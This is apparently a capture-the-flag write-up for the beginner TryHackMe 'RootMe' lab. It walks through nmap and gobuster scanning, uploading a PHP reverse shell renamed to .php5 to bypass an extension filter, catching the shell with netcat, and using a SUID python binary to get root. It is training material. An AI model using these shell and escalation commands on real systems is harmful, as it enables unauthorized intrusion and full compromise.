![Screenshot 2023-08-17 195731.png](RootMe%20017d0cf7d078432089cc26c90876ba89/default_tryhackme.png)

![Screenshot 2023-08-17 195731.png](RootMe%20017d0cf7d078432089cc26c90876ba89/280x280?11d59cb34397e986062eb515f4d32421.png)

# RootMe

A ctf for beginners, can you root me?

The skills to be tested and needed to solve this room are: **nmap**, **GoBuster**, **privilege escalation**, **SUID**, **find**, **webshell**, and **gtfobins**.

This room was released today, 9/9/2020. Shout-out to the room creator, **@reddyyZ**. You can access the room at [https://tryhackme.com/room/rootme](https://tryhackme.com/room/rootme)

## Nmap Scan

```bash
nmap -A -Pn -T4 -oN nmap_result.txt 10.10.172.154
```

```bash
# Nmap 7.92 scan initiated Thu Aug 17 09:36:48 2023 as: nmap -A -Pn -T4 -oN nmap_result.txt 10.10.172.154
Nmap scan report for 10.10.172.154
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/17%OT=22%CT=1%CU=44432%PV=Y%DS=5%DC=T%G=Y%TM=64DE22B
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   282.54 ms 10.17.0.1
2   ... 4
5   406.59 ms 10.10.172.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 17 09:37:52 2023 -- 1 IP address (1 host up) scanned in 64.87 seconds
```

Run **gobuster** to look for hidden directories and files on the web server.

```bash
gobuster dir -u http://10.10.172.154/ -w /home/kali/Downloads/SecLists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_output.txt -t 20
```

![Screenshot 2023-08-17 195731.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-17_195731.png)

Visit the hidden directory through your preferred browser.

Type **<Target_IP>*/panel/***

![Screenshot 2023-08-18 030745.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_030745.png)

Looks like we can use this to upload a **web shell** and get a reverse shell. Download the php reverse shell script [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Make sure to change the values in the script with your own IP address and a port of your choice to get a reverse shell

![Screenshot 2023-08-18 030907.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_030907.png)

Here are the values you need to change in the **php-reverse-shell** script

Upon uploading the **php-reverse-shell.php** file, we get a “PHP not permitted” I supposed message

Then, I realized maybe it is just filtering the .php extension, so I renamed the script to a .php5 extension. And that uploaded successfully too

![Screenshot 2023-08-18 031312.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_031312.png)

Successfully uploaded my php reverse-shell script

Start a netcat listener from your attack machine. Type ***nc -nlvp 9999***

Run the php reverse-shell script by using **curl**. 

Type ***curl [http://10.10.177.208/uploads/reverse-shell.php5](http://10.10.177.208/uploads/reverse-shell.php5)***

Go back to check on your listener if you have a connection

![Screenshot 2023-08-18 031418.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_031418.png)

**Netcat Shell Stabilisation**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Search for the user.txt using **find**. Type **find / -name user.txt -type f 2>/dev/null**

- ***type f*** – you are telling find to look exclusively for files
- ***name user.txt*** – instructing the find command to search for a file with the name “user.txt”
- ***2> /dev/null*** – so error messages do not show up as part of the search result

user.txt file is found at location **/var/www/user.txt**

Retrieve the content of user.txt. Type ***cat /var/www/user.txt***

Search for files with SUID permission to escalate our privilege using **find**. Type ***find / type -f -user root -perm -u=s 2> /dev/null***

![Screenshot 2023-08-18 032046.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_032046.png)

Check **gtfobins** on how to exploit the suid above. Access gtfobins [here](https://gtfobins.github.io/). Then search for the specific binary you found above and study how you can exploit through SUID.

![Screenshot 2023-08-18 032222.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_032222.png)

Escalate our privilege to root user. Type ***python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’***

![Screenshot 2023-08-18 032341.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_032341.png)

Search for root.txt. Type ***find / -type f -name root.txt***

found root.txt file location **/root/root.txt**

Retrieve the content of root.txt. Type ***cat /root/root.txt***

![Screenshot 2023-08-18 032528.png](RootMe%20017d0cf7d078432089cc26c90876ba89/Screenshot_2023-08-18_032528.png)

found the root flag!